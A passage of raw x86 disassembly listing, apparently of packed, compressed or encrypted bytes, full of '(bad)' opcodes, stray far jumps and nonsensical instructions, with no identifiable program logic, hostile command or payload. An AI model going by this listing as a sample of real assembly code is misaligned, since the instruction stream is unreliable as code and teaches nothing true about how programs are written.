  41f2cc:	shl    BYTE PTR [ebp+0x39],cl
  41f2cf:	(bad)  
  41f2d0:	(bad)  
  41f2d1:	out    dx,eax
  41f2d2:	mov    ebx,0x7d124a9f
  41f2d7:	stos   DWORD PTR es:[edi],eax
  41f2d8:	bound  ecx,QWORD PTR [ecx+ebx*8]
  41f2db:	push   esi
  41f2dc:	sub    bh,bh
  41f2de:	fnsave [edx-0x37]
  41f2e1:	lods   al,BYTE PTR ds:[esi]
  41f2e2:	inc    ebx
  41f2e3:	js     0x41f318
  41f2e5:	not    BYTE PTR [edx]
  41f2e7:	pop    ebp
  41f2e8:	jmp    0x458b:0x9b4b23b5
  41f2ef:	fs mov dh,0xff
  41f2f2:	test   DWORD PTR [edi],eax
  41f2f4:	xor    al,0x8b
  41f2f6:	sbb    esp,DWORD PTR [edi-0x44]
  41f2f9:	scas   al,BYTE PTR es:[edi]
  41f2fa:	mov    al,BYTE PTR [ecx*2-0x73052ee1]
  41f301:	aas    
  41f302:	sbb    bl,cl
  41f304:	xchg   al,bl
  41f306:	(bad)  
  41f307:	lods   eax,DWORD PTR ds:[esi]
  41f308:	scas   eax,DWORD PTR es:[edi]
  41f309:	adc    BYTE PTR [ebx],0x91
  41f30c:	(bad)  
  41f30d:	out    0x25,eax
  41f30f:	mov    al,0xba
  41f311:	mov    ch,0x7c
  41f313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f314:	xchg   esp,eax
  41f315:	or     eax,0x5c0a6e43
  41f31a:	fwait
  41f31b:	mov    ebp,0x682e2691
  41f320:	retf   0x24a1
  41f323:	(bad)  
  41f325:	push   esi
  41f326:	xor    cl,bh
  41f328:	xchg   DWORD PTR [esi-0x3b],edx
  41f32b:	imul   esi,DWORD PTR [ebp-0x39],0x70
  41f32f:	shr    ch,cl
  41f331:	xchg   DWORD PTR fs:[ebx+0x54209171],esi
  41f338:	(bad)  
  41f339:	dec    esi
  41f33a:	nop
  41f33b:	or     al,0x79
  41f33d:	pop    esi
  41f33e:	sbb    DWORD PTR [esi+0x71728897],esi
  41f344:	sbb    edx,esp
  41f346:	leave  
  41f347:	sub    ah,bl
  41f349:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f34a:	xor    ch,dh
  41f34c:	add    esp,edx
  41f34e:	retf   
  41f34f:	gs (bad) 
  41f351:	cld    
  41f352:	mov    edx,0x34479a10
  41f357:	fwait
  41f358:	nop
  41f359:	in     al,0x50
  41f35b:	inc    esi
  41f35c:	mov    al,ds:0xe0da91bf
  41f361:	repz enter 0xab98,0x5f
  41f366:	lods   al,BYTE PTR ds:[esi]
  41f367:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f368:	cld    
  41f369:	lock fistp DWORD PTR [ecx-0x6e985399]
  41f370:	test   DWORD PTR [eax+eiz*4],esp
  41f373:	add    dh,bl
  41f375:	xchg   esi,eax
  41f376:	xor    al,0xc2
  41f378:	fldenv [edi-0x16]
  41f37b:	sbb    dh,al
  41f37d:	dec    esi
  41f37e:	stos   DWORD PTR es:[edi],eax
  41f37f:	(bad)  
  41f380:	push   eax
  41f381:	ret    0xee7
  41f384:	sub    ebp,edi
  41f386:	pop    edi
  41f387:	stos   BYTE PTR es:[edi],al
  41f388:	push   edx
  41f389:	mov    ecx,0xf9c0b93b
  41f38e:	jecxz  0x41f3a7
  41f390:	lea    ecx,[ebx]
  41f392:	adc    ebp,eax
  41f394:	es xchg ebp,eax
  41f396:	jb     0x41f327
  41f398:	mov    WORD PTR [ebx-0x56],cs
  41f39b:	arpl   WORD PTR [edx+0x32c85eca],sp
  41f3a1:	popa   
  41f3a2:	or     al,0xb4
  41f3a4:	pop    edx
  41f3a5:	xchg   DWORD PTR [esi+0x263ad97b],edi
  41f3ab:	mov    ebx,ecx
  41f3ad:	call   0x22fa:0x2a43b509
  41f3b4:	and    al,BYTE PTR [esi+edx*2+0x4]
  41f3b8:	stc    
  41f3b9:	and    ebp,DWORD PTR [eax+0x8]
  41f3bc:	xor    DWORD PTR [ecx-0x4e856c13],ebp
  41f3c2:	ss cld 
  41f3c4:	cs retf 0xeee2
  41f3c8:	data16 cmp BYTE PTR [esi],al
  41f3cb:	sbb    eax,0xa516b607
  41f3d0:	jo     0xda9adee9
  41f3d6:	xor    BYTE PTR [edx-0x6b],al
  41f3d9:	inc    ebx
  41f3da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3db:	add    cl,BYTE PTR [ecx-0x67]
  41f3de:	jmp    0xc3fb:0x39b5b75
  41f3e5:	scas   al,BYTE PTR es:[edi]
  41f3e6:	pushf  
  41f3e7:	mov    ebx,0x4f6145fe
  41f3ec:	aas    
  41f3ed:	outs   dx,DWORD PTR ds:[esi]
  41f3ee:	pop    ecx
  41f3ef:	adc    DWORD PTR [ebx],ebx
  41f3f1:	fs push 0x2e
  41f3f4:	cmp    BYTE PTR [ebp-0x6e],bh
  41f3f7:	xchg   BYTE PTR [eax+ebp*2],dh
  41f3fa:	stc    
  41f3fb:	and    al,0xfc
  41f3fd:	ret    0x9a07
  41f400:	mov    edx,0x7a2357e0
  41f405:	xor    dl,bl
  41f407:	and    BYTE PTR [ebp+0x2e],al
  41f40a:	in     al,dx
  41f40b:	test   al,0x69
  41f40d:	pop    esp
  41f40e:	push   ss
  41f40f:	popf   
  41f410:	push   esp
  41f411:	imul   ecx,esi,0xdd85e06c
  41f417:	xor    ecx,DWORD PTR [ecx+0x6a]
  41f41a:	scas   eax,DWORD PTR es:[edi]
  41f41b:	xchg   esp,eax
  41f41c:	pop    esi
  41f41d:	aas    
  41f41e:	imul   edi,DWORD PTR [eax],0xc46abec8
  41f424:	clc    
  41f425:	gs sbb eax,0x5c8e96b5
  41f42b:	mov    al,0xab
  41f42d:	add    ebp,ebx
  41f42f:	inc    DWORD PTR ds:0x4e6f71e8
  41f435:	(bad)  
  41f436:	repz and eax,0x2b80babf
  41f43c:	cdq    
  41f43d:	in     al,0x28
  41f43f:	rol    BYTE PTR [eax],cl
  41f441:	js     0x41f43a
  41f443:	mov    eax,0xbaace6de
  41f448:	push   cs
  41f449:	jecxz  0x41f467
  41f44b:	and    DWORD PTR [ebp+0x76a2ec4],esi
  41f451:	or     al,0x83
  41f453:	stc    
  41f454:	jno    0x41f4a6
  41f456:	enter  0x200d,0xd8
  41f45a:	xchg   esp,ecx
  41f45c:	(bad)  
  41f45d:	fiadd  WORD PTR [eax-0x6ddef4a8]
  41f463:	sbb    dh,BYTE PTR [edx+0x6c]
  41f466:	inc    eax
  41f467:	add    ebp,ecx
  41f469:	lods   al,BYTE PTR ds:[esi]
  41f46a:	shl    BYTE PTR [edx+ecx*1],0x77
  41f46e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f46f:	inc    esi
  41f470:	jb     0x41f44f
  41f472:	xlat   BYTE PTR ds:[ebx]
  41f473:	into   
  41f474:	arpl   si,cx
  41f476:	push   0x500d69de
  41f47b:	cmp    bh,BYTE PTR [edi]
  41f47d:	jmp    0x41f425
  41f47f:	and    bh,BYTE PTR [ecx]
  41f481:	lods   eax,DWORD PTR gs:[esi]
  41f483:	in     al,0x4d
  41f485:	bnd jb 0x41f429
  41f488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f489:	cmp    esp,edi
  41f48b:	mov    DWORD PTR [edi-0x2766a6ce],esp
  41f491:	push   ds
  41f492:	push   edx
  41f493:	sbb    eax,DWORD PTR [edx+0x7fad61dd]
  41f499:	in     eax,0xae
  41f49b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f49c:	push   ebp
  41f49d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f49e:	push   ds
  41f49f:	lahf   
  41f4a0:	rcl    ebp,1
  41f4a2:	push   esp
  41f4a3:	les    ebx,FWORD PTR [edx]
  41f4a5:	jg     0x41f43a
  41f4a7:	nop
  41f4a8:	inc    esp
  41f4a9:	daa    
  41f4aa:	ins    DWORD PTR es:[edi],dx
  41f4ab:	or     ah,BYTE PTR [ebp+ebp*1-0x5474ca10]
  41f4b2:	jnp    0x41f4f3
  41f4b4:	repz sbb al,0x3f
  41f4b7:	in     eax,0x58
  41f4b9:	inc    esp
  41f4ba:	jno    0x41f4d0
  41f4bc:	push   es
  41f4bd:	inc    esi
  41f4be:	xor    al,0xbc
  41f4c0:	(bad)  
  41f4c1:	mov    edx,0x933eae45
  41f4c6:	fs stc 
  41f4c8:	add    al,0x19
  41f4ca:	dec    edi
  41f4cb:	pop    esp
  41f4cc:	outs   dx,BYTE PTR ds:[esi]
  41f4cd:	pop    ebx
  41f4ce:	mov    esi,DWORD PTR [esp+edi*8]
  41f4d1:	stos   BYTE PTR es:[edi],al
  41f4d2:	xor    al,0xbe
  41f4d4:	nop
  41f4d5:	leave  
  41f4d6:	aas    
  41f4d7:	adc    ebx,DWORD PTR [edx+0x63]
  41f4da:	dec    esi
  41f4db:	cmp    eax,0x609b7824
  41f4e0:	pop    es
  41f4e1:	jle    0x41f4d8
  41f4e3:	dec    ebx
  41f4e4:	mov    ebx,0xf13287d5
  41f4e9:	jmp    0x41f4bb
  41f4eb:	fistp  WORD PTR [eax]
  41f4ed:	pushf  
  41f4ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4ef:	ror    DWORD PTR [ebp-0x15a131b9],1
  41f4f5:	mov    ebx,0x653ca567
  41f4fa:	sub    al,BYTE PTR [edx]
  41f4fc:	adc    edi,DWORD PTR [eax]
  41f4fe:	jne    0x41f56d
  41f500:	push   ebp
  41f501:	xchg   ebx,eax
  41f502:	rcl    BYTE PTR [ebx+eax*4],1
  41f505:	dec    esi
  41f506:	ins    DWORD PTR es:[edi],dx
  41f507:	les    ebp,FWORD PTR [ecx+edx*1+0x46]
  41f50b:	sub    eax,0x46ea2312
  41f510:	sar    DWORD PTR [edx-0x2b],cl
  41f513:	std    
  41f514:	sti    
  41f515:	inc    esp
  41f516:	push   es
  41f517:	addr16 mov ecx,0x1232debf
  41f51d:	xor    al,0x3d
  41f51f:	sbb    ebp,DWORD PTR [eax-0x38]
  41f522:	ds and al,0x20
  41f525:	arpl   WORD PTR [edx+0x222f44a4],si
  41f52b:	inc    ebx
  41f52c:	xor    al,0x50
  41f52e:	sub    eax,0xac4c75f
  41f533:	(bad)  
  41f534:	adc    eax,DWORD PTR [edi+0x51b4cbf5]
  41f53a:	int3   
  41f53b:	push   esp
  41f53c:	data16 cs mov bh,al
  41f540:	icebp  
  41f541:	in     eax,0xa1
  41f543:	das    
  41f544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f545:	ret    0x818a
  41f548:	in     al,dx
  41f549:	test   DWORD PTR [ebx+0x17d1c879],0xb72121b
  41f553:	jl     0x41f5aa
  41f555:	loopne 0x41f5b8
  41f557:	inc    edi
  41f558:	out    dx,eax
  41f559:	dec    esi
  41f55a:	jbe    0x41f503
  41f55c:	xchg   ebx,eax
  41f55d:	loopne 0x41f5d4
  41f55f:	jmp    0x1d1b:0xb1677253
  41f566:	add    esi,DWORD PTR [edi+0x7b]
  41f569:	xchg   ebx,eax
  41f56a:	leave  
  41f56b:	xor    cl,dl
  41f56d:	adc    DWORD PTR [edi+0x3b],edx
  41f570:	outs   dx,BYTE PTR ds:[esi]
  41f571:	hlt    
  41f572:	bound  ebp,QWORD PTR [ebp-0x4cf5d4ff]
  41f578:	rcr    ah,0xed
  41f57b:	push   0xcf370e43
  41f580:	inc    edx
  41f581:	cmp    al,0xd6
  41f583:	sar    BYTE PTR [ebp+0x21dc2443],cl
  41f589:	les    esi,FWORD PTR [eax+0x19]
  41f58c:	and    eax,0x2d9e1e58
  41f591:	out    0x23,eax
  41f593:	outs   dx,BYTE PTR ds:[esi]
  41f594:	clc    
  41f595:	inc    esp
  41f596:	add    ecx,eax
  41f598:	push   esi
  41f599:	ds stos DWORD PTR es:[edi],eax
  41f59b:	pop    ds
  41f59c:	dec    ecx
  41f59d:	test   BYTE PTR [edx+0x4a98d1b7],0xe2
  41f5a4:	xchg   esi,eax
  41f5a5:	iret   
  41f5a6:	pop    edi
  41f5a7:	jmp    0xec60:0xfae3a1ad
  41f5ae:	cdq    
  41f5af:	pop    edx
  41f5b0:	mov    ah,0xfc
  41f5b2:	dec    ecx
  41f5b3:	push   edi
  41f5b4:	outs   dx,DWORD PTR ds:[esi]
  41f5b5:	cmp    DWORD PTR [edx],ebx
  41f5b7:	ja     0x41f5ca
  41f5b9:	xor    esi,DWORD PTR [edi]
  41f5bb:	adc    esp,esi
  41f5bd:	xchg   dh,dh
  41f5bf:	push   eax
  41f5c0:	vmwrite esp,DWORD PTR [ecx+0x7]
  41f5c4:	fisttp DWORD PTR ds:0xa54117a
  41f5ca:	and    DWORD PTR [ebx+0x5f],edi
  41f5cd:	sbb    ebx,ebx
  41f5cf:	jge    0x41f644
  41f5d1:	push   esi
  41f5d2:	test   al,0xc4
  41f5d4:	push   ecx
  41f5d5:	push   edx
  41f5d6:	mov    cl,al
  41f5d8:	mov    bl,0x8e
  41f5da:	cmp    DWORD PTR [esi],eax
  41f5dc:	add    eax,0x7729bce3
  41f5e1:	ret    0xde05
  41f5e4:	cmc    
  41f5e5:	jbe    0x41f62d
  41f5e7:	pop    esi
  41f5e8:	shr    BYTE PTR [eax],1
  41f5ea:	mov    edx,DWORD PTR [esi]
  41f5ec:	mov    DWORD PTR [ecx+edi*4+0x17],esi
  41f5f0:	nop    DWORD PTR [edx+0x4bc308a5]
  41f5f7:	ins    BYTE PTR es:[edi],dx
  41f5f8:	stos   BYTE PTR es:[edi],al
  41f5f9:	cmp    DWORD PTR [esi+0x24],0x3a
  41f5fd:	ret    0x734a
  41f600:	popa   
  41f601:	cmp    dh,BYTE PTR [ecx-0x11]
  41f604:	shr    DWORD PTR [ecx-0x1f],0xf4
  41f608:	into   
  41f609:	or     dh,BYTE PTR [di]
  41f60c:	repnz fstp TBYTE PTR [ebx]
  41f60f:	xlat   BYTE PTR ds:[ebx]
  41f610:	jg     0x41f5b6
  41f612:	pop    esp
  41f613:	add    ah,BYTE PTR [ecx+edi*8+0x752fcb1d]
  41f61a:	inc    ebx
  41f61b:	ins    BYTE PTR es:[edi],dx
  41f61c:	jge    0x41f5d0
  41f61e:	icebp  
  41f61f:	div    DWORD PTR [esi-0x4d]
  41f622:	pop    ebx
  41f623:	pop    edi
  41f624:	in     al,dx
  41f625:	jnp    0x41f5e9
  41f627:	cmp    BYTE PTR [esp+edi*2],bl
  41f62a:	shl    BYTE PTR [esp+eiz*4],0x81
  41f62e:	std    
  41f62f:	mov    eax,ds:0x80a6a2f8
  41f634:	jge    0x41f637
  41f636:	pop    ss
  41f637:	mov    ah,0x35
  41f639:	out    dx,eax
  41f63a:	lock fbstp TBYTE PTR [esi]
  41f63d:	(bad)  
  41f63e:	jmp    0x1f0a4919
  41f643:	mov    al,0x18
  41f645:	out    dx,al
  41f646:	dec    esi
  41f647:	xchg   DWORD PTR [eax+0x70],eax
  41f64a:	sbb    eax,0xb82c1970
  41f64f:	popf   
  41f650:	pop    ecx
  41f651:	popf   
  41f652:	lds    edi,FWORD PTR ds:0xc0ecbc66
  41f658:	shl    ah,1
  41f65a:	in     al,dx
  41f65b:	fidiv  DWORD PTR [eax-0x247039ec]
  41f661:	mov    eax,0x4f38381
  41f666:	sahf   
  41f667:	adc    BYTE PTR [edi+0x53],ah
  41f66a:	cmp    DWORD PTR [edi+0x3cdb04ad],esi
  41f670:	ret    
  41f671:	jle    0x41f635
  41f673:	dec    esp
  41f674:	inc    ebx
  41f675:	pop    ds
  41f676:	fdiv   st(4),st
  41f678:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f679:	jg     0x41f69f
  41f67b:	imul   eax,DWORD PTR [ebp+0x2f],0x4313b416
  41f682:	shl    DWORD PTR [ebp-0x2f],cl
  41f685:	popa   
  41f686:	mov    BYTE PTR [esi],0x5a
  41f689:	popf   
  41f68a:	retf   
  41f68b:	aas    
  41f68c:	and    al,0xdd
  41f68e:	cmp    BYTE PTR [ebp+0x17ee1b0],ah
  41f694:	retf   0x71e0
  41f697:	(bad)  
  41f699:	mov    dl,0x42
  41f69b:	ret    0x1c67
  41f69e:	popa   
  41f69f:	mov    dl,0xb3
  41f6a1:	and    esp,edx
  41f6a3:	lock in al,0x9b
  41f6a6:	mov    bh,0xe4
  41f6a8:	aam    0x1c
  41f6aa:	test   eax,0x9f47b3de
  41f6af:	data16 int 0x73
  41f6b2:	pop    edi
  41f6b3:	xor    cl,BYTE PTR [ebx+0x27]
  41f6b6:	(bad)  
  41f6b7:	call   0xf955681
  41f6bc:	mov    WORD PTR [edi],gs
  41f6be:	ja     0x41f71d
  41f6c0:	add    eax,esp
  41f6c2:	jnp    0x41f6f9
  41f6c4:	mov    WORD PTR [ebp-0x15fc1239],ss
  41f6ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6cb:	cwde   
  41f6cc:	pop    ebx
  41f6cd:	mov    WORD PTR [ebx],es
  41f6cf:	inc    edx
  41f6d0:	xchg   esp,eax
  41f6d1:	mov    ds:0x354158db,eax
  41f6d6:	(bad)  
  41f6d7:	(bad)  
  41f6d8:	fist   WORD PTR [ebx+ebx*8]
  41f6db:	xchg   esp,eax
  41f6dc:	inc    esi
  41f6dd:	xchg   edi,eax
  41f6de:	aas    
  41f6df:	out    0x18,al
  41f6e1:	push   esp
  41f6e2:	mov    ah,0xd2
  41f6e4:	xchg   ebp,esp
  41f6e6:	sbb    al,0x3a
  41f6e8:	sub    BYTE PTR [edx+0x1f111818],ch
  41f6ee:	arpl   WORD PTR [esi],bx
  41f6f0:	cmp    ah,dh
  41f6f2:	cmp    eax,0xe884989a
  41f6f7:	push   edx
  41f6f8:	pop    esp
  41f6f9:	jae    0x41f6d2
  41f6fb:	sub    eax,0xd6d2e0b6
  41f700:	push   ss
  41f701:	clc    
  41f702:	xchg   ecx,eax
  41f703:	push   ebp
  41f704:	mov    ?,esp
  41f706:	push   edi
  41f707:	mov    ds:0x501d8c78,eax
  41f70c:	in     eax,dx
  41f70d:	mov    esp,0x7569d4b1
  41f712:	push   ebp
  41f713:	in     al,0x20
  41f715:	jle    0x41f706
  41f717:	xchg   ecx,eax
  41f718:	sahf   
  41f719:	or     esi,DWORD PTR [edx]
  41f71b:	mov    bh,0x5c
  41f71d:	xor    ebx,eax
  41f71f:	(bad)  
  41f720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f721:	jbe    0x41f73e
  41f723:	and    eax,0x2c052a3e
  41f728:	lods   eax,DWORD PTR ds:[esi]
  41f729:	mov    esi,0x8b94f08
  41f72e:	clc    
  41f72f:	xchg   esp,eax
  41f730:	iret   
  41f731:	fcom   QWORD PTR [eax+0x80ff00]
  41f737:	(bad)  
  41f738:	aaa    
  41f739:	hlt    
  41f73a:	test   DWORD PTR [ebp-0xc],esi
  41f73d:	dec    esp
  41f73e:	xor    eax,0x5de2cbd
  41f743:	pop    esi
  41f744:	mov    DWORD PTR [eax+eiz*8-0x345fb4c2],ecx
  41f74b:	dec    DWORD PTR [edi-0x5e8ceb64]
  41f751:	daa    
  41f752:	mov    al,ds:0x6b585540
  41f757:	xor    al,0x69
  41f759:	sub    eax,ecx
  41f75b:	cmp    eax,0x8913ccc0
  41f760:	mov    ecx,0x373ba7a
  41f765:	mov    WORD PTR [edx+0x8],?
  41f768:	repnz push cs
  41f76a:	scas   al,BYTE PTR es:[edi]
  41f76b:	jne    0x41f799
  41f76d:	loopne 0x41f779
  41f76f:	xor    al,0xda
  41f771:	in     eax,dx
  41f772:	push   ecx
  41f773:	outs   dx,BYTE PTR ds:[esi]
  41f774:	mov    ah,0xc9
  41f776:	dec    edi
  41f777:	nop/reserved BYTE PTR [edi+0x3b70e876]
  41f77e:	imul   ebx,DWORD PTR [ecx+0x1fa64475],0x45
  41f785:	mov    WORD PTR [ecx+edx*1+0x52],?
  41f789:	ret    
  41f78a:	and    bl,BYTE PTR [edx]
  41f78c:	xchg   BYTE PTR [esi-0xefb659c],cl
  41f792:	adc    eax,ebp
  41f794:	mov    al,0x93
  41f796:	mov    al,0x11
  41f798:	out    dx,eax
  41f799:	jmp    0x9962:0xd2f9b122
  41f7a0:	sub    BYTE PTR [edi-0x1b],0x63
  41f7a4:	cmp    al,0xf8
  41f7a6:	ss aad 0x58
  41f7a9:	cmp    edi,DWORD PTR [esi+0x3]
  41f7ac:	in     eax,0x48
  41f7ae:	enter  0x44ab,0xcf
  41f7b2:	clc    
  41f7b3:	inc    edi
  41f7b4:	and    dh,bh
  41f7b6:	pop    esp
  41f7b7:	mov    ebp,0xb80dcf7d
  41f7bc:	mov    ebp,DWORD PTR [edx+0x40]
  41f7bf:	mov    WORD PTR [ebp+0x11a16e68],?
  41f7c5:	dec    ebp
  41f7c6:	xchg   edi,eax
  41f7c7:	test   edi,edi
  41f7c9:	inc    ebp
  41f7ca:	inc    BYTE PTR [eax]
  41f7cc:	mov    al,0x57
  41f7ce:	mov    ebp,0x2eb6aafe
  41f7d3:	sub    BYTE PTR [esi+ecx*8-0x10],ah
  41f7d7:	add    DWORD PTR [ebx+0x52786166],edi
  41f7dd:	push   es
  41f7de:	cmp    DWORD PTR [eax+0x5d],esp
  41f7e1:	fs icebp 
  41f7e3:	out    dx,eax
  41f7e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7e5:	shl    BYTE PTR [eax+0x4f],1
  41f7e8:	ja     0x41f78f
  41f7ea:	xor    BYTE PTR [eax],ch
  41f7ec:	xor    al,0xe
  41f7ee:	mov    ss,WORD PTR [ebp-0x30]
  41f7f1:	retf   
  41f7f2:	and    bl,BYTE PTR [ebp-0x5a]
  41f7f5:	scas   al,BYTE PTR es:[edi]
  41f7f6:	into   
  41f7f7:	ror    ebp,0x61
  41f7fa:	hlt    
  41f7fb:	mov    eax,DWORD PTR [ebx+0x4256f309]
  41f801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f802:	mov    BYTE PTR [edi],dh
  41f804:	xchg   esi,eax
  41f805:	fmulp  st(7),st
  41f807:	cs ja  0x41f836
  41f80a:	es out 0xe1,eax
  41f80d:	inc    ebp
  41f80e:	mov    bl,0xd2
  41f810:	cwde   
  41f811:	or     DWORD PTR [ebx],esi
  41f813:	fbstp  TBYTE PTR [edi]
  41f815:	nop
  41f816:	and    bh,dl
  41f818:	sub    eax,DWORD PTR [esi+0x5d403a82]
  41f81e:	aaa    
  41f81f:	out    dx,eax
  41f820:	dec    ecx
  41f821:	sbb    bl,BYTE PTR [edi-0x24]
  41f824:	xor    eax,0x8dd58dac
  41f829:	jnp    0x41f850
  41f82b:	cli    
  41f82c:	(bad)  
  41f82d:	ret    
  41f82e:	cdq    
  41f82f:	ds dec edx
  41f831:	inc    edi
  41f832:	mov    edx,DWORD PTR [ecx]
  41f834:	or     eax,0xc8dc1f34
  41f839:	lahf   
  41f83a:	mov    ds:0xa912704c,eax
  41f83f:	hlt    
  41f840:	(bad)  [ebp+eax*8+0x6d1a8fe1]
  41f847:	jge    0x41f850
  41f849:	or     DWORD PTR [eax+0xc2e2fe],edi
  41f84f:	imul   ebp,DWORD PTR [ebx+edi*2],0x37
  41f853:	sub    al,0x0
  41f855:	fisttp DWORD PTR [ebx-0x4f]
  41f858:	mov    eax,ds:0xc1fad9dd
  41f85d:	je     0x41f8dd
  41f85f:	(bad)  
  41f860:	(bad)  
  41f861:	(bad)  
  41f863:	pop    ecx
  41f864:	lea    ecx,[edi]
  41f866:	pop    edx
  41f867:	in     eax,0xfc
  41f869:	sti    
  41f86a:	xor    bh,dl
  41f86c:	xchg   DWORD PTR [ecx-0x487fd8a7],eax
  41f872:	mov    ebx,0x895d9a4f
  41f877:	pop    edi
  41f878:	addr16 daa 
  41f87a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f87b:	sar    DWORD PTR [esi+0x16],cl
  41f87e:	iret   
  41f87f:	(bad)  
  41f880:	adc    edx,esp
  41f882:	sub    dl,al
  41f884:	repnz mov ds,WORD PTR [edx]
  41f887:	ror    DWORD PTR [ebx],0xb4
  41f88a:	pop    ss
  41f88b:	imul   ecx,DWORD PTR [ecx+eiz*8],0x4e
  41f88f:	xchg   esp,eax
  41f890:	lds    esi,FWORD PTR [ebx-0x24b8d982]
  41f896:	sub    DWORD PTR [edx+0x68],edx
  41f899:	dec    ebx
  41f89a:	pop    esp
  41f89b:	inc    eax
  41f89c:	inc    edx
  41f89d:	sbb    dh,BYTE PTR [ebx]
  41f89f:	loope  0x41f8f6
  41f8a1:	ss mov ebp,0xe4785390
  41f8a7:	xor    eax,0x896d9506
  41f8ac:	nop
  41f8ad:	pop    ss
  41f8ae:	cwde   
  41f8af:	sbb    ah,bh
  41f8b1:	inc    ecx
  41f8b2:	adc    eax,DWORD PTR [esi-0x6a1b91b]
  41f8b8:	push   0x8626910f
  41f8bd:	inc    ebx
  41f8be:	cs or  al,0x8f
  41f8c1:	bound  ebx,QWORD PTR [ebp-0x64]
  41f8c4:	fist   DWORD PTR cs:[ebp+0x3d]
  41f8c8:	push   ds
  41f8c9:	push   0xcb4df815
  41f8ce:	jbe    0x41f8a2
  41f8d0:	imul   ebx,DWORD PTR [eax-0xb],0x35
  41f8d4:	dec    ebp
  41f8d5:	in     al,dx
  41f8d6:	adc    edx,esi
  41f8d8:	icebp  
  41f8d9:	jl     0x41f8f9
  41f8db:	jmp    0xc479:0x69a0302
  41f8e2:	push   esi
  41f8e3:	scas   al,BYTE PTR es:[edi]
  41f8e4:	cwde   
  41f8e5:	mov    ecx,0xd156a708
  41f8ea:	push   es
  41f8eb:	dec    ebp
  41f8ec:	inc    eax
  41f8ed:	mov    bl,0x6d
  41f8ef:	inc    edx
  41f8f0:	or     dl,BYTE PTR [ebx]
  41f8f2:	push   cs
  41f8f3:	pop    ebx
  41f8f4:	mov    ecx,DWORD PTR [ecx-0x33]
  41f8f7:	or     ebx,edx
  41f8f9:	adc    eax,0xbdf147a3
  41f8fe:	cmp    al,0xf3
  41f900:	push   cs
  41f901:	(bad)  
  41f902:	jle    0x41f8b6
  41f904:	xchg   DWORD PTR [edi+0x77d5d495],esi
  41f90a:	dec    eax
  41f90b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f90c:	or     esp,DWORD PTR ds:0x6dcb9da0
  41f912:	xchg   ebp,eax
  41f913:	push   cs
  41f914:	mov    edx,gs
  41f916:	aad    0x4e
  41f918:	or     BYTE PTR [ecx+0x44],0x89
  41f91c:	add    BYTE PTR [ebp+0x3a],ch
  41f91f:	mov    ecx,esi
  41f921:	jmp    0xb77c:0x40428432
  41f928:	into   
  41f929:	xchg   BYTE PTR ds:0x3166ec33,bh
  41f92f:	mov    ds:0x9275b84f,eax
  41f934:	sar    BYTE PTR [ecx],1
  41f936:	mov    ds:0xed8f1739,al
  41f93b:	mov    eax,0xb103e2e4
  41f940:	push   ss
  41f941:	jg     0x41f8fe
  41f943:	jp     0x41f94d
  41f945:	mov    dh,0x24
  41f947:	sub    al,0x3a
  41f949:	out    dx,eax
  41f94a:	sub    eax,0x41c232e0
  41f94f:	aas    
  41f950:	mov    al,ds:0x29d35305
  41f955:	test   al,0x44
  41f957:	fsubrp st(7),st
  41f959:	push   ebx
  41f95a:	jb     0x41f906
  41f95c:	cli    
  41f95d:	ucomiss xmm3,xmm0
  41f960:	sub    BYTE PTR [ebp+0x1f],dh
  41f963:	and    eax,0xbaa92dc9
  41f968:	push   edx
  41f969:	lgs    esp,FWORD PTR [ebx]
  41f96c:	or     ebx,DWORD PTR [ebp+0x28386791]
  41f972:	pusha  
  41f973:	imul   eax,DWORD PTR [ecx],0x5e40e6ac
  41f979:	sbb    BYTE PTR [edi],ah
  41f97b:	aaa    
  41f97c:	shl    BYTE PTR ss:[edi+0x2f],cl
  41f980:	sub    eax,0xed4b3117
  41f985:	adc    bl,BYTE PTR [esi-0x7c]
  41f988:	data16 sbb ah,al
  41f98b:	mov    bh,0xb5
  41f98e:	bt     DWORD PTR [edx],edx
  41f991:	pop    eax
  41f992:	out    dx,al
  41f993:	(bad)  [ecx+0x67]
  41f996:	xchg   edx,eax
  41f997:	mov    dh,0x98
  41f999:	mov    eax,0xd245f578
  41f99e:	test   eax,0x33a71a80
  41f9a3:	pop    ecx
  41f9a4:	mov    esi,0xb9fea7d1
  41f9a9:	fisub  WORD PTR [eax+0x26]
  41f9ac:	stos   DWORD PTR es:[edi],eax
  41f9ad:	out    dx,al
  41f9ae:	cmp    DWORD PTR [eax+ecx*4],0xd448e32f
  41f9b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9b6:	dec    eax
  41f9b7:	jp     0x41f9ed
  41f9b9:	pop    ss
  41f9ba:	and    dh,BYTE PTR [ebx-0x5a]
  41f9bd:	cli    
  41f9be:	dec    edx
  41f9bf:	sbb    DWORD PTR [ecx],esi
  41f9c1:	pop    eax
  41f9c2:	mov    ebx,0x484913e9
  41f9c7:	cmp    al,0x63
  41f9c9:	out    0xbb,eax
  41f9cb:	inc    edx
  41f9cc:	jmp    0x41fa04
  41f9ce:	cmc    
  41f9cf:	clc    
  41f9d0:	adc    ch,ah
  41f9d2:	fdivr  DWORD PTR [ebx+ecx*1]
  41f9d5:	adc    al,BYTE PTR [ecx+0x37922248]
  41f9db:	cld    
  41f9dc:	add    BYTE PTR [ebx+0x5],bl
  41f9df:	aaa    
  41f9e0:	gs push edx
  41f9e2:	mov    esp,0xdaf48eac
  41f9e7:	jns    0x41f980
  41f9e9:	cmp    ebx,DWORD PTR [esi+0x1bf2efdc]
  41f9ef:	jl     0x41fa39
  41f9f1:	(bad)  
